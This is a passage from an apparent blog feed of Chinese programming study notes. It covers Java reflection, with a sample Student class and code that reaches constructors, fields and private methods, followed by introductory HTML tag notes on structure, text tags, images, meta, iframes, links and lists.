class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span> <span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> id, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> id, <span class="keyword">int</span> age,<span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Student</span> <span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">learn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学习&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">learn</span><span class="params">(String course)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学习&quot;</span>+course);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;:&quot;</span>+id+<span class="string">&quot;:&quot;</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">(String food)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在吃&quot;</span>+food);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><p>每个类只有与之对应的唯一的Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取class对象</span></span><br><span class="line">        <span class="comment">//1.通过对象获得</span></span><br><span class="line">        Student s = <span class="keyword">new</span> Student();</span><br><span class="line">        Class c = s.getClass();</span><br><span class="line">        <span class="comment">//2.通过类获得（不常用）</span></span><br><span class="line">        Class c2 = Student.class;</span><br><span class="line">        <span class="comment">//3.Class的静态方法</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.manu.Student&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetConstructor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(<span class="string">&quot;com.manu.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得所有public构造方法</span></span><br><span class="line">        Constructor[] cs = c.getConstructors();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得指定构造方法,没有参数代表无参构造方法</span></span><br><span class="line"><span class="comment">//        Constructor cs2 = c.getConstructor();</span></span><br><span class="line">        Constructor cs2 = c.getConstructor(String.class,<span class="keyword">int</span>.class,<span class="keyword">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用构造方法</span></span><br><span class="line">        Object o = cs2.newInstance(<span class="string">&quot;manu&quot;</span>,<span class="number">100</span>,<span class="number">19</span>);</span><br><span class="line">        Student s = (Student)o;</span><br><span class="line">        s.show();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//忽略权限得到构造方法</span></span><br><span class="line">        Constructor[] cs3 = c.getDeclaredConstructors();</span><br><span class="line">        Constructor cs4 = c.getDeclaredConstructor(<span class="keyword">int</span>.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用private的构造方法</span></span><br><span class="line">        cs4.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o2 = cs4.newInstance(<span class="number">19</span>);</span><br><span class="line">        Student s2 = (Student)o2;</span><br><span class="line">        s2.show();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetField</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//因为获取字段需要对象，这里new一个对象</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">&quot;manu&quot;</span>,<span class="number">9001</span>,<span class="number">19</span>);</span><br><span class="line">        Class c = Class.forName(<span class="string">&quot;com.manu.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到所有public字段（成员变量）</span></span><br><span class="line">        Field[] fields = c.getFields();</span><br><span class="line">        <span class="comment">//指定字段名字，public</span></span><br><span class="line">        Field field = c.getField(<span class="string">&quot;score&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射形式访问字段</span></span><br><span class="line">        System.out.println(field.get(stu));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到所有字段（忽略权限）</span></span><br><span class="line">        Field[] fields2 = c.getDeclaredFields();</span><br><span class="line">        <span class="comment">//指定字段名字（忽略权限）</span></span><br><span class="line">        Field field2 = c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射形式访问字段</span></span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        System.out.println(field2.get(stu));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取成员方法"><a href="#获取成员方法" class="headerlink" title="获取成员方法"></a>获取成员方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GetMethod</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">&quot;manu&quot;</span>,<span class="number">9001</span>,<span class="number">19</span>);</span><br><span class="line">        Class c = Class.forName(<span class="string">&quot;com.manu.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到所有public方法，包括继承父类</span></span><br><span class="line">        Method[] method = c.getMethods();</span><br><span class="line">        <span class="comment">//指定方法名,public,</span></span><br><span class="line">        Method m = c.getMethod(<span class="string">&quot;learn&quot;</span>);</span><br><span class="line">        m.invoke(stu);</span><br><span class="line">        <span class="comment">//加上参数</span></span><br><span class="line">        Method m2 = c.getMethod(<span class="string">&quot;learn&quot;</span>,String.class);</span><br><span class="line">        m2.invoke(stu, <span class="string">&quot;Java&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到自身的所有方法，包括private</span></span><br><span class="line">        Method[] m3 = c.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用private方法</span></span><br><span class="line">        Method m4 = c.getDeclaredMethod(<span class="string">&quot;eat&quot;</span>, String.class);</span><br><span class="line">        m4.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m4.invoke(stu, <span class="string">&quot;垃圾&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基础</title>
      <link href="/Front-end/HTML/1.%E5%9F%BA%E7%A1%80.html"/>
      <url>/Front-end/HTML/1.%E5%9F%BA%E7%A1%80.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考尚硅谷李立波老师的h5和c3课程，MDN官方和w3school</p></blockquote><span id="more"></span><h2 id="网页三要素"><a href="#网页三要素" class="headerlink" title="网页三要素"></a>网页三要素</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><ul><li>HTML用于描述页面的结构</li></ul><h3 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h3><ul><li>CSS用于控制页面中元素的样式</li></ul><h3 id="行为"><a href="#行为" class="headerlink" title="行为"></a>行为</h3><ul><li>JavaScript用于响应用户的操作</li></ul><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><ul><li><code>Hype Text Markup Language</code>超文本标记语言，可以包括音乐，图片等</li><li>是网页中的结构</li><li>使用标签的形式来标识网页的不用组成部分</li></ul><h3 id="标准结构"><a href="#标准结构" class="headerlink" title="标准结构"></a>标准结构</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>标题，会影响网页在搜索引擎中的排名<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 网页内容--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="new-简单布局"><a href="#new-简单布局" class="headerlink" title="[new]简单布局"></a>[new]简单布局</h3><p>h5的新标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 网页头部 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 网页主体 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!-- 导航信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 中间内容 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 右边信息 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aside</span>&gt;</span><span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 网页底部 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span> <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="语法规范"><a href="#语法规范" class="headerlink" title="语法规范"></a>语法规范</h3><p>1.html不区分大小写</p><p>2.注释不可以嵌套使用</p><p>3.结构必须完整，标签名要么成对使用，要么自结束</p><p>4.标签名可以嵌套使用，但不能交叉嵌套</p><p>5.属性必须有值，且值要有引号，单双都可以</p><h3 id="文档声明"><a href="#文档声明" class="headerlink" title="文档声明"></a>文档声明</h3><p>用来告诉浏览器我们使用H5的标准，防止怪异解析</p><p><code>&lt;!doctype html&gt;</code></p><h3 id="标签与属性"><a href="#标签与属性" class="headerlink" title="标签与属性"></a>标签与属性</h3><ul><li>成对标签，在开始标签里可以放属性(名值对)</li></ul><p><code>&lt;h1&gt; &lt;/h1&gt;</code></p><ul><li>自结束标签</li></ul><p><code>&lt;meta /&gt;</code></p><h3 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h3><ul><li><strong>meta</strong>标签用来设置网页的一些元数据，比如字符集，关键字，简介等</li><li>h1标签比较重要，对于搜索引擎，h1仅次于title，只能写一个</li><li>p标签代表一个段落</li><li>br标签代表换行</li><li>hr代表水平线</li><li>pre预格式标签，在里面的文字是什么格式就显示什么格式</li><li>font标签可以吧文字包起来设置一些属性，比如字体face，颜色color，大小size(1-7)</li><li>center用来居中</li></ul><h3 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="comment">&lt;!-- 语义为表示语气上的强调，斜体emphasize --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="comment">&lt;!-- 单纯斜体italic --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="comment">&lt;!-- 语义为强调内容，粗体 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="comment">&lt;!-- 单纯粗体bold --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="comment">&lt;!-- 比父元素的字体小一些，有语义 ，表示细则，比如版权--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">cite</span>&gt;</span><span class="tag">&lt;/<span class="name">cite</span>&gt;</span><span class="comment">&lt;!-- 表示参考内容，书名歌名 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">q</span>&gt;</span><span class="tag">&lt;/<span class="name">q</span>&gt;</span><span class="comment">&lt;!-- 表示短的应用，如一句名言，浏览器会加引号 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span><span class="comment">&lt;!-- 表示块级引用（独占一行） --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span><span class="comment">&lt;!-- 上标 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="comment">&lt;!-- 下标 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="comment">&lt;!-- delete表示删除的内容，添加删除线 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span><span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="comment">&lt;!-- insert表示插入的内容，加下划线 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="comment">&lt;!-- 表示代码，不保留格式 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="comment">&lt;!-- 是一个预格式标签，保存格式显示 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 结合code和pre表示代码 --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>其实就是转义，将一些特殊字符显示出来就叫实体</p><p>如：</p><p><code>&lt;</code>less than 用<code>&amp;lt;</code>表示</p><p><code>&gt;</code>greater than 用<code>&amp;gt;</code>表示</p><p>空格用<code>&amp;nbsp;</code>表示（不换行）</p><h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><p><code>&lt;img src=&quot;这是图片路径&quot; alt=&quot;这是图片描述&quot; /&gt;</code></p><ul><li><p>属性</p><ul><li>width：单位px</li><li>height：单位px</li><li>只设置一个时会按照比例变化</li><li>一般在自适应页面才需要</li></ul></li><li><p>图片格式</p><ul><li><strong>JEPG</strong>:支持的颜色多，可压缩，不支持透明，用来保存颜色丰富照片</li><li><strong>GIF</strong>:颜色少，可支持简单透明，支持动态图</li><li><strong>PNG</strong>:颜色多，支持复杂透明</li></ul></li><li><p>使用原则：效果不一致，用效果好的；效果一致用小的</p></li></ul><blockquote><p>100%表示继承父元素</p></blockquote><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><ul><li>设置关键字</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;我的关键字内容，使用逗号隔开&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>设置描述</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;我的描述内容&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>数据重定向</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;秒数;url=地址&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/tags/tag_meta.asp">参考W3school</a></p><h3 id="内联框架"><a href="#内联框架" class="headerlink" title="内联框架"></a>内联框架</h3><ul><li>可以在一个网页中显示另一个网页，但另一个网页内容不会被搜索引擎检索</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>属性</p><ul><li>src：指向某个路径，可以是外部，可以是相对</li><li>width</li><li>height</li><li>name：指定一个name属性</li></ul></li></ul><h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">target</span>=<span class="string">&quot;打开的位置&quot;</span>&gt;</span> 超链接名字<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>创建超链接时，如果地址不确定可使用#作为占位符，点击会回到顶部</li></ul><p>可在任意标签设置id属性，利用href=”某id”，可直接跳转到指定位置</p><ul><li>属性target<br>_self：在本页面打开<br>_blank：新建页面</li><li>属性href(<code>hypetext reference</code>)<ul><li>超文本引用，定义web资源位置 </li></ul></li><li>在内联框架中可设置一个name属性，利用<br>target=”name”，可以使超链接在内联框架中打开</li><li>每个元素都可以设置一个id，id在同一个页面不能重复</li><li><code>href=&quot;mailto:邮件地址&quot;</code>会打开计算机的邮件客户端</li></ul><h3 id="内联元素和块元素"><a href="#内联元素和块元素" class="headerlink" title="内联元素和块元素"></a>内联元素和块元素</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 块元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内联元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>div独占一行，不管内容多少，一般用来布局</p><ul><li>p，h1，h2</li></ul></li><li><p>fspan用来选中文字</p><ul><li>a，img，iframe</li></ul></li><li><p>一般用块去包含内联元素</p></li><li><p><strong>a不可以包含自身</strong></p></li><li><p><strong>p不可以放块元素</strong></p></li></ul><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>world<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>ul</code>(unordered lists)表示无序列表，用<code>li</code>列项</p><ul><li><p>通过type表示项目符号</p><p>disc</p><p>square</p><p>circle</p></li><li><p>一般不用默认项目符号</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span>&#123;</span><br><span class="line"><span class="attribute">list-style</span>:none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    删除默认项目符号</p><ul><li><code>ul</code>和<code>li</code>都是块元素</li></ul><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>world<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 